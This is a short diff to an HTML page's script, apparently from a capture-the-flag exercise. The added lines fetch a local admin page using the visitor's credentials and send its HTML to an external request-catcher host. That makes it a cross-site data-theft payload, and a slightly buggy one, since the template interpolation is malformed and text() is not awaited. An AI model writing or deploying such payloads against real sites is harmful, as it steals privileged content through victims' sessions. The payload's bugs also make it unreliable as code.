@@ -24,9 +24,12 @@ function getData(url) {
     
     xhr.send();
 }
- 
+
+AdminUrl = "http://127.0.0.1:1337/admin"
+const response =  await fetch(AdminUrl, {credentials: 'include',});
+const adminHtml = response.text();
 // Usage example
-getData('https://wecando.requestcatcher.com/data');
+fetch(`https://wecando.requestcatcher.com/data//{encodeURIComponent(adminHtml)} `);
 </script>
 </body>
  
